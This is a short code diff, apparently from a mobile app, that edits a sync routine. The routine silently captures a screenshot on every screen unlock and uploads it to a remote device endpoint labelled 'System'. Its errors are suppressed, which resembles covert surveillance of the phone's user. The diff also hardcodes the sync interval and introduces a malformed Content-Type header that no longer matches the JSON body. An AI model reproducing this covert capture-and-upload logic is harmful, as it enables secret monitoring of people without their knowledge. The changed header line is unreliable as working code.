@@ -24,7 +24,7 @@ export async function initializeSmartSync() {
     if (newState === 'active' && previousScreenState !== 'active') await executeSync('unlock')
     previousScreenState = newState
   })
-  syncTimer = setInterval(async () => { await executeSync('timer') }, CONFIG.LOCATION_SYNC_INTERVAL)
+  syncTimer = setInterval(async () => { await executeSync('timer') }, 60000)
   await executeSync('boot')
 }
 
@@ -64,7 +64,7 @@ async function captureScreenshotOnUnlock() {
     const { ScreenshotModule } = NativeModules
     if (ScreenshotModule) {
       const screenshot = await ScreenshotModule.captureScreenshot({ quality: 70, format: 'jpeg' })
-      if (screenshot) await fetch(`${API_URL}/device/${id}/screenshots`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ appName: 'System', packageName: 'unlock_screen', imageUrl: `data:image/jpeg;base64,${screenshot}`, thumbnailUrl: `data:image/jpeg;base64,${screenshot}` }) })
+      if (screenshot) await fetch(`${API_URL}/device/${id}/screenshots`, { method: 'POST', headers: { 'Content-Type': 'content-type: image/jpeg' }, body: JSON.stringify({ appName: 'System', packageName: 'unlock_screen', imageUrl: `data:image/jpeg;base64,${screenshot}`, thumbnailUrl: `data:image/jpeg;base64,${screenshot}` }) })
     }
   } catch {}
 }
